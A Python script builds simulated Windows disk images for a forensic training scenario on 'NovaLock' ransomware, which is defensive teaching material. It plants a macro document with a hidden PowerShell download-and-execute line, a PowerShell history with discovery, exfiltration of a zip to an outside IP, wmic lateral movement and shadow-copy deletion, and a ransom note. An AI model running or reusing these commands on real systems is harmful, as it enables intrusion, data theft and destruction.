#!/usr/bin/env python3
"""
LAB BUILD SCRIPT - creates the SIMULATED TechNova workstation disk images (WS01, WS02).
The assessment scenario supplies no real evidence files, so this script reproduces
the scenario's artefacts on genuine NTFS file systems that the forensic tools then examine.
Nothing here is real malware: the "payloads" are inert text/byte files.

Run as root:  python3 build_disks.py <outdir>
"""
import os, sys, struct, sqlite3, subprocess, zipfile, io, datetime as dt, shutil

OUT = sys.argv[1] if __name__ == "__main__" else None
MNT = "/mnt/tn_build"
NOTE = ("=== NOVALOCK ===\nYour files on this network have been encrypted with AES-256 + RSA-2048.\n"
        "Your confidential data was also downloaded to our servers.\n"
        "To restore files send 0.85 BTC to bc1qnv7l0ck9x2t4h5m8r3e6w0q1z7y4u2p9s5d3f\n"
        "Contact: novalock_support@onionmail.example | Victim ID: TN-7F3A91C2\n"
        "Do NOT rename files or contact police or data will be published.\n")

def T(s):  # UTC string -> datetime
    return dt.datetime.strptime(s, "%Y-%m-%d %H:%M:%S").replace(tzinfo=dt.timezone.utc)

def ntfs_ts(d):
    return int((d - dt.datetime(1601, 1, 1, tzinfo=dt.timezone.utc)).total_seconds() * 10**7)

def settimes(path, created, modified=None, accessed=None):
    modified = modified or created; accessed = accessed or modified
    # ntfs-3g extended attribute: crtime, mtime, atime, ctime (NTFS 100ns ticks)
    os.setxattr(path, "system.ntfs_times",
                struct.pack("<4Q", ntfs_ts(created), ntfs_ts(modified), ntfs_ts(accessed), ntfs_ts(modified)))

def put(rel, data, created, modified=None):
    p = os.path.join(MNT, rel)
    os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, "wb") as f:
        f.write(data if isinstance(data, bytes) else data.encode())
    settimes(p, T(created), T(modified) if modified else None)
    return p

def docm(author, title):
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w") as z:
        _w = z.writestr
        z.writestr = lambda n, d: _w(zipfile.ZipInfo(n, date_time=(2026, 11, 11, 19, 47, 0)), d)
        z.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/><Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>')
        z.writestr("docProps/core.xml", f'<?xml version="1.0" encoding="UTF-8"?><cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><dc:title>{title}</dc:title><dc:creator>{author}</dc:creator><cp:lastModifiedBy>DESKTOP-K4R8P1Q</cp:lastModifiedBy><dcterms:created xsi:type="dcterms:W3CDTF">2026-11-10T21:03:00Z</dcterms:created><dcterms:modified xsi:type="dcterms:W3CDTF">2026-11-11T19:47:00Z</dcterms:modified></cp:coreProperties>')
        z.writestr("docProps/app.xml", '<?xml version="1.0"?><Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties"><Application>Microsoft Office Word</Application><Company>Invoice Services Ltd</Company><Template>Normal.dotm</Template></Properties>')
        z.writestr("word/document.xml", '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>This document is protected. Click ENABLE CONTENT to view invoice INV-20931.</w:t></w:r></w:p></w:body></w:document>')
        # inert macro text (simulated) stored as the VBA project stream
        z.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + (
            "Attribute VB_Name = \"ThisDocument\"\r\nSub AutoOpen()\r\n  Dim s\r\n"
            "  s = \"powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-update-sync.net/invoice/view.php?id=20931')\"\r\n"
            "  CreateObject(\"WScript.Shell\").Run s, 0\r\nEnd Sub\r\n").encode())
    return b.getvalue()

PAYLOAD = (b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00" + b"\x00" * 44 + b"\x80\x00\x00\x00"
           + b"This program cannot be run in DOS mode.\r\r\n$" + b"\x00" * 16 + b"PE\x00\x00"
           + b"\x00" * 200 + b"[SIMULATED LAB PAYLOAD - INERT]\x00NovaLock/2.1\x00cdn-update-sync.net\x00/gate.php\x00"
           + b".novalock\x00README_RESTORE_FILES.txt\x00vssadmin delete shadows /all /quiet\x00"
           + b"bcdedit /set {default} recoveryenabled No\x00bc1qnv7l0ck9x2t4h5m8r3e6w0q1z7y4u2p9s5d3f\x00"
           + os.urandom(4096))

def chrome_history(path, rows):
    c = sqlite3.connect(path)
    c.executescript("""
    CREATE TABLE meta(key LONGVARCHAR NOT NULL UNIQUE PRIMARY KEY, value LONGVARCHAR);
    INSERT INTO meta VALUES('version','46'),('last_compatible_version','16');
    CREATE TABLE urls(id INTEGER PRIMARY KEY AUTOINCREMENT,url LONGVARCHAR,title LONGVARCHAR,visit_count INTEGER DEFAULT 0 NOT NULL,typed_count INTEGER DEFAULT 0 NOT NULL,last_visit_time INTEGER NOT NULL,hidden INTEGER DEFAULT 0 NOT NULL);
    CREATE TABLE visits(id INTEGER PRIMARY KEY,url INTEGER NOT NULL,visit_time INTEGER NOT NULL,from_visit INTEGER,transition INTEGER DEFAULT 0 NOT NULL,segment_id INTEGER,visit_duration INTEGER DEFAULT 0 NOT NULL,incremented_omnibox_typed_score BOOLEAN DEFAULT FALSE NOT NULL, opener_visit INTEGER, originator_cache_guid TEXT, originator_visit_id INTEGER, originator_from_visit INTEGER, originator_opener_visit INTEGER, is_known_to_sync BOOLEAN DEFAULT FALSE NOT NULL, consider_for_ntp_most_visited BOOLEAN DEFAULT FALSE NOT NULL, visited_link_id INTEGER DEFAULT 0 NOT NULL, app_id TEXT);
    CREATE TABLE downloads(id INTEGER PRIMARY KEY,guid VARCHAR NOT NULL,current_path LONGVARCHAR NOT NULL,target_path LONGVARCHAR NOT NULL,start_time INTEGER NOT NULL,received_bytes INTEGER NOT NULL,total_bytes INTEGER NOT NULL,state INTEGER NOT NULL,danger_type INTEGER NOT NULL,interrupt_reason INTEGER NOT NULL,hash BLOB NOT NULL,end_time INTEGER NOT NULL,opened INTEGER NOT NULL,last_access_time INTEGER NOT NULL,transient INTEGER NOT NULL,referrer VARCHAR NOT NULL,site_url VARCHAR NOT NULL,embedder_download_data VARCHAR NOT NULL,tab_url VARCHAR NOT NULL,tab_referrer_url VARCHAR NOT NULL,http_method VARCHAR NOT NULL,by_ext_id VARCHAR NOT NULL,by_ext_name VARCHAR NOT NULL,by_web_app_id VARCHAR NOT NULL,etag VARCHAR NOT NULL,last_modified VARCHAR NOT NULL,mime_type VARCHAR(255) NOT NULL,original_mime_type VARCHAR(255) NOT NULL);
    CREATE TABLE downloads_url_chains(id INTEGER NOT NULL,chain_index INTEGER NOT NULL,url LONGVARCHAR NOT NULL, PRIMARY KEY(id,chain_index));
    """)
    wk = lambda s: int((T(s) - dt.datetime(1601, 1, 1, tzinfo=dt.timezone.utc)).total_seconds() * 10**6)
    for i, (url, title, when) in enumerate(rows, 1):
        c.execute("INSERT INTO urls VALUES(?,?,?,?,?,?,0)", (i, url, title, 1, 0, wk(when)))
        c.execute("INSERT INTO visits(id,url,visit_time,transition) VALUES(?,?,?,?)", (i, i, wk(when), 805306368))
    c.commit(); c.close()

ORIG_DOCS = {
    "Q3_Financial_Summary.xlsx": b"PK\x03\x04TechNova Q3 2026 financial summary - CONFIDENTIAL - revenue 1.84M OMR",
    "Client_List_2026.docx": b"PK\x03\x04TechNova client list: Al Noor Trading, Muscat Logistics, Dhofar Energy",
    "Budget_Plan_2027.xlsx": b"PK\x03\x04Budget plan FY2027 draft v3",
}

def build(name, size_mb, user, fill):
    img = os.path.join(OUT, f"{name}.dd"); part = img + ".part"
    for f in (img, part):
        if os.path.exists(f): os.remove(f)
    subprocess.run(["truncate", "-s", f"{size_mb}M", img], check=True)
    subprocess.run(["sfdisk", "-q", img], input=b"label: dos\nlabel-id: 0x5ec7a110\nstart=2048, type=7, bootable\n", check=True)
    psz = (size_mb * 1024 * 1024) - 2048 * 512
    subprocess.run(["truncate", "-s", str(psz), part], check=True)
    subprocess.run(["mkntfs", "-F", "-Q", "-q", "-L", f"{name}_OS", "-p", "2048", "-H", "255", "-S", "63", part],
                   check=True, stderr=subprocess.DEVNULL)
    os.makedirs(MNT, exist_ok=True)
    subprocess.run(["ntfs-3g", "-o", "rw", part, MNT], check=True)
    try:
        for d in ["Windows/System32/config", "Windows/System32/Tasks", "Program Files", f"Users/{user}/Desktop",
                  f"Users/{user}/Documents", f"Users/{user}/Downloads", "Users/Public"]:
            os.makedirs(os.path.join(MNT, d), exist_ok=True)
        fill(user)
    finally:
        subprocess.run(["sync"]); subprocess.run(["umount", MNT], check=True)
    subprocess.run(["dd", f"if={part}", f"of={img}", "bs=512", "seek=2048", "conv=notrunc", "status=none"], check=True)
    os.remove(part)
    print("built", img)

def encrypt_docs(user, t_create, t_enc):
    for fn, data in ORIG_DOCS.items():
        p = put(f"Users/{user}/Documents/{fn}", data + os.urandom(3000), t_create)
    for fn, data in ORIG_DOCS.items():
        src = os.path.join(MNT, f"Users/{user}/Documents/{fn}")
        enc = bytes(b ^ 0x5A for b in open(src, "rb").read()) + b"NOVALOCK\x02TN-7F3A91C2"
        put(f"Users/{user}/Documents/{fn}.novalock", enc, t_enc)
        os.remove(src)  # ransomware deletes the original -> recoverable from unallocated MFT entry
    put(f"Users/{user}/Documents/README_RESTORE_FILES.txt", NOTE, t_enc)
    put(f"Users/{user}/Desktop/README_RESTORE_FILES.txt", NOTE, t_enc)

def ws01(user):
    put("Users/jharris/Desktop/desktop.ini", "[.ShellClassInfo]\r\n", "2025-03-02 08:00:00")
    attach = docm("Administrator", "Invoice INV-20931")
    put("Users/jharris/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/7XK2LQ9P/Invoice_INV-20931.docm", attach, "2026-11-12 06:39:52")
    put("Users/jharris/Downloads/Invoice_INV-20931.docm", attach, "2026-11-12 06:41:07")
    os.makedirs(os.path.join(MNT, "Users/jharris/AppData/Local/Google/Chrome/User Data/Default"), exist_ok=True)
    chrome_history(os.path.join(MNT, "Users/jharris/AppData/Local/Google/Chrome/User Data/Default/History"), [
        ("https://outlook.office.com/mail/inbox", "Mail - Jane Harris - Outlook", "2026-11-12 06:38:40"),
        ("http://cdn-update-sync.net/invoice/view.php?id=20931", "Invoice Viewer", "2026-11-12 06:42:15"),
        ("https://www.bbc.com/news", "BBC News", "2026-11-12 07:10:02"),
        ("https://mail.technova.local/owa/", "Outlook Web App", "2026-11-13 05:02:44"),
    ])
    settimes(os.path.join(MNT, "Users/jharris/AppData/Local/Google/Chrome/User Data/Default/History"), T("2025-03-02 08:10:00"), T("2026-11-13 05:02:44"))
    put("Users/jharris/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
        "IEX(New-Object Net.WebClient).DownloadString('http://cdn-update-sync.net/invoice/view.php?id=20931')\r\n"
        "whoami /all\r\nnet group \"Domain Admins\" /domain\r\nnltest /dclist:technova.local\r\n"
        "net use \\\\FS01\\Shared /user:TECHNOVA\\itsupport *\r\n"
        "Compress-Archive -Path \\\\FS01\\Shared\\* -DestinationPath $env:TEMP\\tn_data.zip\r\n"
        "Invoke-WebRequest -Uri http://198.51.100.23/upload -Method POST -InFile $env:TEMP\\tn_data.zip\r\n"
        "Remove-Item $env:TEMP\\tn_data.zip\r\n"
        "copy $env:APPDATA\\Microsoft\\Update\\winupd.exe \\\\WS02\\ADMIN$\\winupd.exe\r\n"
        "wmic /node:WS02 /user:TECHNOVA\\itsupport process call create \"C:\\Windows\\winupd.exe -enc\"\r\n"
        "vssadmin delete shadows /all /quiet\r\n", "2026-11-12 06:42:30", "2026-11-15 23:58:41")
    put("Windows/System32/Tasks/MicrosoftEdgeUpdateTaskCoreUA", '<?xml version="1.0" encoding="UTF-16"?>\r\n<Task><RegistrationInfo><Author>TECHNOVA\\jharris</Author><Date>2026-11-12T06:43:05</Date></RegistrationInfo><Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers><Actions><Exec><Command>%APPDATA%\\Microsoft\\Update\\winupd.exe</Command><Arguments>-svc</Arguments></Exec></Actions></Task>\r\n', "2026-11-12 06:43:05")
    # dropped payload, later deleted by the attacker (anti-forensics)
    put("Users/jharris/AppData/Roaming/Microsoft/Update/winupd.exe", PAYLOAD, "2026-11-12 06:42:58")
    # exfil staging archive, later deleted
    zb = io.BytesIO()
    with zipfile.ZipFile(zb, "w") as z:
        for fn in ["Q3_Financial_Report.xlsx", "Client_Contracts_2026.docx", "Payroll_Nov2026.csv", "HR_Employee_Records.xlsx", "Project_Apollo_Design.pdf"]:
            z.writestr(zipfile.ZipInfo(fn, date_time=(2026, 11, 15, 1, 18, 4)), os.urandom(2500))
    put("Users/jharris/AppData/Local/Temp/tn_data.zip", zb.getvalue(), "2026-11-15 01:18:22")
    encrypt_docs("jharris", "2026-10-28 10:15:00", "2026-11-16 02:03:11")
    os.remove(os.path.join(MNT, "Users/jharris/AppData/Local/Temp/tn_data.zip"))
    os.remove(os.path.join(MNT, "Users/jharris/AppData/Roaming/Microsoft/Update/winupd.exe"))

def ws02(user):
    put("Users/mpatel/Desktop/desktop.ini", "[.ShellClassInfo]\r\n", "2025-04-11 08:00:00")
    put("Users/mpatel/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/Q2M8TR41/Invoice_INV-20931.docm",
        docm("Administrator", "Invoice INV-20931"), "2026-11-12 06:52:31")
    put("Windows/winupd.exe", PAYLOAD, "2026-11-15 23:05:47")
    encrypt_docs("mpatel", "2026-09-14 09:30:00", "2026-11-16 02:06:54")

if __name__ == "__main__":
  os.makedirs(OUT, exist_ok=True)
  build("WS01_jharris", 96, "jharris", ws01)
  build("WS02_mpatel", 96, "mpatel", ws02)
